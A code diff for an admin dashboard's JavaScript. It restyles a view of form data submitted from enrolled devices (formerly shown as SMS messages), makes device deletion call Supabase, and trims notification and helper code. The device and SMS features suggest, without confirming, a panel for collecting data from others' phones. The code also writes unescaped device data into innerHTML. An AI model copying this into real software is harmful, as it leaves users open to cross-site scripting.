+            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 10px;">
+                <div style="font-weight: 600; color: #333; margin-bottom: 10px;">
+                    <i class="fas fa-file-signature" style="color: #f3722c; margin-right: 8px;"></i>
+                    ${form.form_name}
                 </div>
-                <div class="sms-message" style="white-space: pre-line;">${form.data}</div>
+                <div style="background: white; padding: 12px; border-radius: 6px; font-family: monospace; white-space: pre-line;">
+                    ${form.data}
+                </div>
             </div>
         `;
     });
@@ -1405,7 +1219,6 @@ function showViewFormsModal(deviceId, deviceName) {
 
 // ================= CHANGE PASSWORD =================
 function showChangePasswordModal() {
-    // Reset form
     document.getElementById('currentPassword').value = '';
     document.getElementById('newPassword').value = '';
     document.getElementById('confirmPassword').value = '';
@@ -1448,10 +1261,31 @@ function changeAdminPassword() {
 }
 
 // ================= DELETE DEVICE =================
-function deleteDevice(deviceId, deviceIdentifier) {
-    if (confirm(`Delete device: ${deviceIdentifier}?`)) {
-        showNotification(`Device ${deviceIdentifier} deleted`, 'success');
-        loadDevices(); // Reload
+async function deleteDevice(deviceId, deviceIdentifier) {
+    if (!confirm(`Delete device: ${deviceIdentifier}?`)) {
+        return;
+    }
+    
+    try {
+        if (supabase) {
+            const { error } = await supabase
+                .from('devices')
+                .delete()
+                .eq('id', deviceId);
+            
+            if (error) throw error;
+            
+            showNotification(`Device ${deviceIdentifier} deleted`, 'success');
+            loadDevices();
+            
+        } else {
+            showNotification(`[DEMO] Device ${deviceIdentifier} would be deleted`, 'success');
+            loadDevices();
+        }
+        
+    } catch (error) {
+        console.error('Error deleting device:', error);
+        showNotification('Error: ' + error.message, 'error');
     }
 }
 
@@ -1479,51 +1313,24 @@ function showNotification(message, type = 'info') {
     const container = document.getElementById('notificationContainer');
     
     const notification = document.createElement('div');
-    notification.className = `notification ${type}-notification`;
+    notification.className = `notification ${type}`;
     notification.innerHTML = `
         <i class="fas fa-${type === 'success' ? 'check-circle' : 
                          type === 'error' ? 'exclamation-triangle' : 
                          'info-circle'}"></i>
-        <span>${message}</span>
+        ${message}
     `;
     
     container.appendChild(notification);
     
-    // Remove after 5 seconds
     setTimeout(() => {
         if (notification.parentNode) {
-            notification.style.opacity = '0';
-            notification.style.transform = 'translateX(100%)';
-            setTimeout(() => {
-                if (notification.parentNode) {
-                    notification.remove();
-                }
-            }, 300);
+            notification.remove();
         }
     }, 5000);
 }
 
-// ================= HELPER FUNCTIONS =================
-function formatTime(timestamp) {
-    const date = new Date(timestamp);
-    const now = new Date();
-    const diff = now - date;
-    const minutes = Math.floor(diff / 60000);
-    
-    if (minutes < 1) return 'Just now';
-    if (minutes < 60) return `${minutes} minutes ago`;
-    
-    const hours = Math.floor(minutes / 60);
-    if (hours < 24) return `${hours} hours ago`;
-    
-    return date.toLocaleDateString('en-IN', {
-        day: 'numeric',
-        month: 'short',
-        hour: '2-digit',
-        minute: '2-digit'
-    });
-}
-
+// ================= LOGOUT =================
 function handleLogout() {
     if (confirm('Logout from dashboard?')) {
         localStorage.removeItem('admin_logged_in');
